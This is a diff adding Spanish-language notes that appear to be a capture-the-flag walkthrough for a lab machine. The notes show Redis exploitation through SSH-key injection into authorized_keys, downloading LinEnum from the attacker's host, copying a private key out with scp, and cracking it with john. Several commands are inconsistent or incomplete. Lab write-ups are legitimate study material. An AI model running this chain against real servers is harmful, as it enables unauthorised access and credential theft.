@@ -1,0 +1,121 @@
+Ip objetiv> 10.10.10.160
+
+# escaneo de la maquina>
+
+nmap -sC -sV 10.10.10.160 -o nmap.txt
+
+Port 6379 — Redis 4.0.9
+
+# Escaneo con dirbuster 
+# Escaneo con nikto
+
+searchsploit redis
+
+redis 4.x / 5.x - Unauthenticated code Execution (Metasploit) ----------------| exploits/linux/remote/47195.rb
+# no me funciono. 
+
+# Descargar redis.py>
+Referencia de redis.io 
+
+https://redis.io/
+https://redis.io/commands
+https://redis.io/commands/flushall // Para limpiar configuracion de llave de otros. 
+
+Elimine todas las claves de todas las bases de datos existentes, no solo la seleccionada actualmente. Este comando nunca falla.
+
+Uso de redis.py 
+
+https://github.com/buffered4ever/Exploits/blob/master/redis/redis.py
+
+Descarga del server redis en carpeta postman>
+
+https://github.com/Avinash-acid/Redis-Server-Exploit
+
+mv module.so exp.so
+
+Instalar tambien >
+
+apt install redis-tool
+
+redis-cli -h 10.10.10.160 -p 6379 flushall
+
+ctrl+c 
+
+cat j.txt | redis-cli -h 10.10.10.160 -p 6379 -x set r-key
+
+redis-cli -h 10.10.10.160 -p 6379
+
+CONFIG SET dir
+
+CONFIG SET dir /var/lib/redis/.ssh
+
+CONFIG set dbfilename "authorized_keys"
+
+save
+
+ctrl + c
+
+ssh -i id_rsa redis@10.10.10.160
+
+password>
+
+# # En otra terminal # #
+
+~# mkdir linenum
+~# cd linenum/
+
+Descargar LinEnum 
+
+uso de LinEnum para descubrir vulnerabilidades y ubicaciones de archivos y carpetas>
+
+https://github.com/rebootuser/LinEnum
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+# # Ejecutar servidor http en la carpeta que contiene LinEnum # #
+
+python -m SimpleHTTPServer
+
+ python -m SimpleHTTPServer 8484 # Cambiar puerto
+
+ 
+Maquina_Objetivo: 
+
+{
+
+cd /var/tmp
+which wget
+cp /usr/bin/wget /var/tmp
+wget 10.10.x.x:8000/LinEnum.sh
+ls -la
+chmod +x LinEnum.sh
+ls -la
+./LinEnum
+
+Resultad>
+
+user> 
+
+Matt 
+
+.bak > id_rsa.bak
+
+# Entrar a la carpeta opt y copiar el archivo > 
+
+cd /opt
+
+scp id_rsa.bak 10.10.x.x:root/ # copiar el archivo de 
+
+# Convertir archivo en hash y crackear con john > 
+
+python /usr/share/john/ssh2john.py id_rsa.bak > id_rsa.hash
+
+cat id_rsa_hash
+
+chmod 700 id_rsa_hash
+
+/usr/sbin/john --wordlist=/share/john/wordlists/rockyou.txt.gz id_rsa_hash
+
+
+
+
